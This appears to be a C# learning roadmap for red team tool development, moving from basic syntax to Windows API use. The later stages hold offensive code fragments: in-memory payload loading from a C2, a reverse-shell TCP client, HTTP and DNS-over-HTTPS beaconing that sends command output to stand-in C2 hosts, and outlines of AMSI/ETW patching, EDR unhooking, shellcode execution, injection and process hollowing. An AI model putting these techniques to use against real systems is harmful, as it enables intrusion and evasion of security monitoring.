## 🟢 Stage 1 — Language Basics
> Mandatory. No tool can be written without syntax fundamentals.

### Step 1 — Hello World & Program Structure
`namespace`, `class`, `Main()` — program entry point.
```csharp
Console.WriteLine("Hello, World!");
```

### Step 2 — Variables & Data Types
`int`, `double`, `float`, `bool`, `char`, `string`. Value type vs reference type.
```csharp
int port = 4444;
string host = "10.0.0.1";
bool isOpen = true;
```

### Step 3 — Type Conversion
`Convert.ToInt32()`, `int.Parse()`, `int.TryParse()`. Essential when parsing network data.
```csharp
string input = "4444";
int port = int.Parse(input);
```

### Step 4 — Operators
Arithmetic (`+`, `-`, `*`, `/`, `%`), comparison (`==`, `!=`, `>`, `<`), logical (`&&`, `||`, `!`), assignment (`+=`, `-=`).

### Step 5 — String Operations
`Length`, `ToUpper()`, `ToLower()`, `Trim()`, `Replace()`, `Contains()`, `Split()`, `Substring()`, string interpolation.
```csharp
string beacon = $"HOST={host};PORT={port}";
string[] parts = "10.0.0.1:4444".Split(':');
```

### Step 6 — Conditional Statements
`if`, `else if`, `else`, `switch`.
```csharp
if (isOpen) Console.WriteLine("[+] Port open");
else Console.WriteLine("[-] Filtered");
```

### Step 7 — Ternary & Null Coalescing
`? :` and `??` — compact conditionals.
```csharp
string status = isOpen ? "OPEN" : "CLOSED";
string target = input ?? "127.0.0.1";
```

### Step 8 — Loops: for & while
Loop variables, `break`, `continue`.
```csharp
for (int port = 1; port <= 1024; port++)
    Scan(host, port);
```

### Step 9 — Loops: foreach & do-while
Iterating over collections.
```csharp
foreach (string host in liveHosts)
    Console.WriteLine($"[+] {host}");
```

### Step 10 — Methods
Parameters, return types, `void`, overloading.
```csharp
bool IsPortOpen(string host, int port) => TcpConnect(host, port);
```

---

## 🔵 Stage 2 — Collections
> Every Red Team tool stores and processes data — hosts, ports, credentials, results.

### Step 11 — Arrays
Fixed-size. Shellcode byte arrays, static port lists.
```csharp
byte[] shellcode = { 0x90, 0x90, 0xCC };
int[] commonPorts = { 22, 80, 443, 3389 };
```

### Step 12 — List\<T\>
Dynamic collection. Live hosts, open ports, loot accumulation.
```csharp
var liveHosts = new List<string>();
liveHosts.Add("10.0.0.1");
liveHosts.Sort();
```

### Step 13 — Dictionary\<TKey, TValue\>
Key-value store. Credential storage, port-to-service mapping, recon results.
```csharp
var creds = new Dictionary<string, string>();
creds["admin"] = "Password123!";
var portMap = new Dictionary<int, string> { {22, "SSH"}, {3389, "RDP"} };
```

### Step 14 — HashSet\<T\>
Unique elements only. Deduplicating scanned IPs.
```csharp
var scanned = new HashSet<string>();
scanned.Add("10.0.0.1");
scanned.Add("10.0.0.1"); // ignored
```

### Step 15 — Queue\<T\> & Stack\<T\>
C2 task queue (FIFO), execution history (LIFO).
```csharp
var taskQueue = new Queue<string>();
taskQueue.Enqueue("whoami");
taskQueue.Enqueue("ipconfig");
string next = taskQueue.Dequeue(); // → "whoami"
```

---

## 🟣 Stage 3 — Object-Oriented Programming
> Structuring tools professionally — Scanner, Beacon, Implant, C2 channel classes.

### Step 16 — Classes & Objects
Structuring tools — Scanner, Beacon, Implant classes.
```csharp
class PortScanner
{
    public string Target { get; set; }
    public List<int> OpenPorts { get; set; } = new();
}
```

### Step 17 — Properties & Access Modifiers
`public`, `private`, `internal`. Encapsulating implant configs.
```csharp
class BeaconConfig
{
    public string C2Host { get; set; }
    private int _sleepInterval = 60;
    public int SleepInterval => _sleepInterval;
}
```

### Step 18 — Constructors
Parameterized constructors — tool initialization.
```csharp
class ReverseShell
{
    private string _host;
    private int _port;

    public ReverseShell(string host, int port)
    {
        _host = host;
        _port = port;
    }
}
```

### Step 19 — Interfaces
`interface` — unifying different C2 channels under a single contract. Defines *what*, not *how*.
```csharp
interface IC2Channel
{
    string Receive();
    void Send(string data);
}

class HttpChannel : IC2Channel
{
    public string Receive() => PollHttp();
    public void Send(string data) => PostHttp(data);
}

class TcpChannel : IC2Channel
{
    public string Receive() => ReadSocket();
    public void Send(string data) => WriteSocket(data);
}
```

### Step 20 — Polymorphism & Virtual Methods
Overriding base class behavior for different C2 channel implementations.
```csharp
class C2Channel
{
    public virtual string Receive() => "";
}

class HttpChannel : C2Channel
{
    public override string Receive() => PollHttp();
}
```

### Step 21 — Static Members & Static Classes
Utility classes — helper methods, constant config values.
```csharp
static class Utils
{
    public static string XorEncrypt(string data, byte key) { ... }
    public static byte[] ToBytes(string hex) { ... }
}
```

---

## 🟡 Stage 4 — LINQ
> Filter, transform, and query collections — essential for processing recon data.

### Step 22 — Where & Select
Filter by condition + transform. Processing port and host lists.
```csharp
var highPorts = ports.Where(p => p > 1024).ToList();
var hostnames = results.Select(r => r.Hostname).ToList();
```

### Step 23 — OrderBy, GroupBy, Distinct
Sort results, group, remove duplicates.
```csharp
var sorted = openPorts.OrderBy(p => p).ToList();
var unique = foundHosts.Distinct().ToList();
```

### Step 24 — First, Any, All, Count
Quick checks — is there any admin? Is a port open?
```csharp
bool hasAdmin = users.Any(u => u.Contains("admin"));
int openCount = ports.Count(p => p < 1024);
string first = liveHosts.FirstOrDefault();
```

---

## 🔴 Stage 5 — Essentials
> Every Red Team tool in production relies on these.

### Step 25 — Exception Handling
Mandatory in network tooling — connection failures, timeouts, access denied.
```csharp
try
{
    using TcpClient tc = new TcpClient();
    tc.Connect(host, port);
}
catch (SocketException ex)
{
    Console.WriteLine($"[-] {host}:{port} — {ex.Message}");
}
finally { /* cleanup */ }
```

### Step 26 — Nullable Types & Null Safety
Without null checks, tools crash.
```csharp
string? response = GetC2Response();
string cmd = response ?? "sleep";
int? pid = FindProcess("lsass")?.Id;
```

### Step 27 — Delegates, Lambda, Func/Action
Callbacks, async operations, LINQ chains.
```csharp
Action<string> log = msg => Console.WriteLine($"[*] {msg}");
Func<string, int, bool> isOpen = (host, port) => TcpConnect(host, port);
```

### Step 28 — using & IDisposable
Network connections and file streams must be disposed. `using` calls `Dispose()` automatically.
```csharp
using (TcpClient tc = new TcpClient())
{
    tc.Connect(host, port);
}

class ScanSession : IDisposable
{
    private TcpClient _client = new TcpClient();
    public void Dispose() => _client?.Close();
}
```

### Step 29 — Encoding & Byte Conversion
Shellcode, beacon data, XOR encryption, Base64 payloads — all byte operations.
```csharp
byte[] bytes   = Encoding.UTF8.GetBytes("whoami");
string b64     = Convert.ToBase64String(bytes);
byte[] decoded = Convert.FromBase64String(b64);

byte key = 0x41;
byte[] xored = bytes.Select(b => (byte)(b ^ key)).ToArray();
```

### Step 30 — File I/O
Reading wordlists, writing loot, loading configs — required by every tool.
```csharp
string[] passwords = File.ReadAllLines("wordlist.txt");
File.AppendAllText("results.txt", $"[+] {host}:{port} OPEN\n");
List<string> targets = File.ReadAllLines("targets.txt").ToList();
```

### Step 31 — Async / Await
The most critical topic for network tools. Synchronous scan = slow. Async scan = fast.
```csharp
async Task ScanPortAsync(string host, int port)
{
    try
    {
        using TcpClient tc = new TcpClient();
        await tc.ConnectAsync(host, port);
        Console.WriteLine($"[+] {port} OPEN");
    }
    catch { /* closed */ }
}

var tasks = Enumerable.Range(1, 1024)
    .Select(p => ScanPortAsync(host, p));

await Task.WhenAll(tasks);
```

---

## ⚫ Stage 6 — Windows Internals & API
> This is where Red Team C# tooling actually begins.

### Step 32 — P/Invoke Basics
Calling Windows API functions directly from C# using `DllImport`.
```csharp
using System.Runtime.InteropServices;

[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
static extern bool CloseHandle(IntPtr handle);
```

### Step 33 — Windows Data Types
Mapping Windows types to C# — `HANDLE`, `DWORD`, `LPVOID`, `BOOL`.
```csharp
// Windows HANDLE → IntPtr
// Windows DWORD  → uint
// Windows BOOL   → bool
// Windows LPVOID → IntPtr

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```

### Step 34 — Process Enumeration
Listing running processes — finding targets for injection or privilege escalation.
```csharp
using System.Diagnostics;

foreach (Process proc in Process.GetProcesses())
{
    Console.WriteLine($"[{proc.Id}] {proc.ProcessName}");
}

Process lsass = Process.GetProcessesByName("lsass").FirstOrDefault();
```

### Step 35 — Handle & Memory Basics
Opening process handles, reading/writing remote process memory.
```csharp
[DllImport("kernel32.dll")]
static extern bool ReadProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesRead
);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten
);
```

### Step 36 — Token & Privilege Basics
Querying and adjusting process token privileges.
```csharp
[DllImport("advapi32.dll")]
static extern bool OpenProcessToken(
    IntPtr ProcessHandle,
    uint DesiredAccess,
    out IntPtr TokenHandle
);

// TOKEN_QUERY = 0x0008
// TOKEN_ADJUST_PRIVILEGES = 0x0020
```

---

## 🔥 Stage 7 — Memory Manipulation
> Required for shellcode execution, injection, and in-memory payload loading.

### Step 37 — unsafe & Pointers
Direct memory access using C# pointers. Required for low-level operations.
```csharp
unsafe
{
    int value = 42;
    int* ptr = &value;
    Console.WriteLine(*ptr); // → 42

    // Pinning a byte array for shellcode
    fixed (byte* p = shellcode)
    {
        // p is a raw pointer to the byte array
    }
}
```

### Step 38 — Marshal Class
Converting between managed and unmanaged memory — bridge between C# and Windows API.
```csharp
using System.Runtime.InteropServices;

// Allocate unmanaged memory
IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
Marshal.Copy(shellcode, 0, ptr, shellcode.Length);

// Copy back to managed
byte[] buffer = new byte[shellcode.Length];
Marshal.Copy(ptr, buffer, 0, shellcode.Length);

Marshal.FreeHGlobal(ptr);
```

### Step 39 — VirtualAlloc & Memory Protection
Allocating executable memory — foundation of shellcode execution.
```csharp
const uint MEM_COMMIT  = 0x1000;
const uint MEM_RESERVE = 0x2000;
const uint PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect
);

[DllImport("kernel32.dll")]
static extern bool VirtualProtect(
    IntPtr lpAddress, uint dwSize,
    uint flNewProtect, out uint lpflOldProtect
);
```

### Step 40 — CreateThread & Shellcode Execution
Executing shellcode in the current process via a new thread.
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    out uint lpThreadId
);

[DllImport("kernel32.dll")]
static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);

// Execution flow:
// VirtualAlloc → Marshal.Copy(shellcode) → CreateThread → WaitForSingleObject
```

---

## 🟠 Stage 8 — Reflection & In-Memory Loading
> Loading and executing assemblies entirely in memory — no file touches disk.

### Step 41 — Reflection Basics
Inspecting types, methods, and properties at runtime.
```csharp
using System.Reflection;

Assembly asm = Assembly.GetExecutingAssembly();
foreach (Type t in asm.GetTypes())
    Console.WriteLine(t.FullName);

Type target = asm.GetType("MyNamespace.Payload");
MethodInfo method = target.GetMethod("Run");
method.Invoke(null, null);
```

### Step 42 — Assembly.Load() — In-Memory Execution
Loading a .NET assembly from a byte array — the payload never touches disk.
```csharp
// Download payload bytes from C2
byte[] asmBytes = await DownloadPayload(c2Url);

// Load assembly entirely in memory
Assembly asm = Assembly.Load(asmBytes);

// Invoke entry point
Type type = asm.GetType("Payload.Program");
MethodInfo run = type.GetMethod("Execute");
run.Invoke(null, new object[] { args });
```

### Step 43 — Dynamic Invocation
Calling methods dynamically without static references — useful for evading static analysis.
```csharp
// Instead of direct P/Invoke (detectable):
// var result = VirtualAlloc(...);

// Dynamic invocation via reflection:
Type kernel32 = Type.GetType("...");
MethodInfo virtualAlloc = kernel32.GetMethod("VirtualAlloc");
object result = virtualAlloc.Invoke(null, new object[] { ... });
```

---

## 🔴 Stage 9 — Networking & C2 Communication
> Building real C2 channels — HTTP, TCP, DNS.

### Step 44 — TCP Client & Server
Raw TCP communication — foundation of reverse shells and C2 channels.
```csharp
// TCP Client (implant side)
using TcpClient client = new TcpClient();
await client.ConnectAsync("10.0.0.1", 4444);
NetworkStream stream = client.GetStream();
byte[] buf = new byte[4096];
int n = await stream.ReadAsync(buf, 0, buf.Length);
string cmd = Encoding.UTF8.GetString(buf, 0, n);

// TCP Listener (C2 side)
TcpListener listener = new TcpListener(IPAddress.Any, 4444);
listener.Start();
TcpClient conn = await listener.AcceptTcpClientAsync();
```

### Step 45 — HTTP Beaconing
HTTP-based C2 communication — blends with normal web traffic.
```csharp
using HttpClient http = new HttpClient();

// Beacon check-in — GET task
string task = await http.GetStringAsync("http://c2.host/task");

// Send results — POST output
var content = new StringContent(output, Encoding.UTF8, "application/json");
await http.PostAsync("http://c2.host/result", content);

// Jitter — randomized sleep to evade timing detection
int jitter = new Random().Next(1000, 5000);
await Task.Delay(sleepInterval * 1000 + jitter);
```

### Step 46 — DNS over HTTPS (DoH) Beaconing
Covert C2 channel via DNS queries — bypasses many network-layer controls.
```csharp
// Encode command output in DNS subdomain
string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(output))
    .Replace("+", "-").Replace("/", "_").Replace("=", "");

string dnsQuery = $"{encoded}.c2domain.com";

// Query via DoH to avoid local DNS monitoring
string dohUrl = $"https://1.1.1.1/dns-query?name={dnsQuery}&type=TXT";
string response = await http.GetStringAsync(dohUrl);
```

### Step 47 — Named Pipes
Lateral movement communication channel — used for inter-process and cross-host C2.
```csharp
using System.IO.Pipes;

// Server (C2 / operator side)
using NamedPipeServerStream server = new NamedPipeServerStream("redteam");
await server.WaitForConnectionAsync();

// Client (implant side)
using NamedPipeClientStream client = new NamedPipeClientStream(".", "redteam",
    PipeDirection.InOut);
await client.ConnectAsync();
```

---

## 🟤 Stage 10 — AV / EDR Evasion
> Techniques to bypass security controls — detection evasion, hook circumvention.

### Step 48 — AMSI Bypass
Patching the Anti-Malware Scan Interface in memory to prevent script scanning.
```csharp
// AMSI scans managed code at runtime
// Patching AmsiScanBuffer() to always return AMSI_RESULT_CLEAN

[DllImport("kernel32")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
    uint flNewProtect, out uint lpflOldProtect);

// Concept: find AmsiScanBuffer → patch first bytes → return clean
```

### Step 49 — ETW Patching
Disabling Event Tracing for Windows to blind EDR telemetry collection.
```csharp
// ETW is used by EDRs to collect runtime telemetry
// EtwEventWrite() in ntdll.dll can be patched to suppress events

// Same pattern as AMSI:
// LoadLibrary("ntdll.dll") → GetProcAddress("EtwEventWrite")
// → VirtualProtect(RW) → patch bytes → VirtualProtect(restore)
```

### Step 50 — Unhooking via Fresh NTDLL
EDRs hook ntdll.dll functions. Loading a fresh copy from disk bypasses their hooks.
```csharp
// EDR hook flow:
// Your code → ntdll (hooked) → EDR inspection → syscall

// Unhook flow:
// 1. Read ntdll.dll from disk (C:\Windows\System32\ntdll.dll)
// 2. Map it manually into memory
// 3. Overwrite the hooked .text section with the clean version
// 4. Your code now calls unhooked syscalls directly
```

### Step 51 — Direct Syscalls
Bypassing EDR userland hooks by invoking syscalls directly without going through ntdll.
```csharp
// Standard API call (hookable):
// VirtualAlloc() → ntdll.NtAllocateVirtualMemory (hooked by EDR)

// Direct syscall approach:
// Embed raw syscall stub → call kernel directly
// Tools: SysWhispers2/3, D/Invoke

// Syscall stub example (x64 assembly):
// mov r10, rcx
// mov eax, <syscall number>
// syscall
// ret
```

### Step 52 — Payload Obfuscation
Hiding shellcode from static AV signatures — encryption and encoding at rest.
```csharp
// XOR encrypt shellcode before embedding
byte key = 0x37;
byte[] encrypted = shellcode.Select(b => (byte)(b ^ key)).ToArray();

// Decrypt at runtime just before execution
byte[] decrypted = encrypted.Select(b => (byte)(b ^ key)).ToArray();

// AES encryption for stronger obfuscation
using Aes aes = Aes.Create();
aes.Key = Convert.FromBase64String(storedKey);
aes.IV  = Convert.FromBase64String(storedIV);
ICryptoTransform decryptor = aes.CreateDecryptor();
byte[] plain = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
```

### Step 53 — Process Injection — Classic
Injecting shellcode into a remote process — the foundation of most post-exploitation.
```csharp
// Classic injection flow:
// 1. OpenProcess(PROCESS_ALL_ACCESS, pid)
// 2. VirtualAllocEx(hProcess, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
// 3. WriteProcessMemory(hProcess, allocAddr, shellcode)
// 4. CreateRemoteThread(hProcess, allocAddr)

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess,
    IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, out uint lpThreadId);
```

### Step 54 — Process Hollowing
Creating a suspended process, replacing its memory with a payload, then resuming.
```csharp
// Process hollowing flow:
// 1. CreateProcess(target, SUSPENDED)
// 2. NtUnmapViewOfSection — hollow out the original image
// 3. VirtualAllocEx — allocate space for payload
// 4. WriteProcessMemory — write payload
// 5. SetThreadContext — update entry point register (RCX/EIP)
// 6. ResumeThread — execute payload under legitimate process identity

[DllImport("kernel32.dll")]
static extern bool CreateProcess(string lpApplicationName,
    string lpCommandLine, IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes, bool bInheritHandles,
    uint dwCreationFlags, IntPtr lpEnvironment,
    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation);
```

---
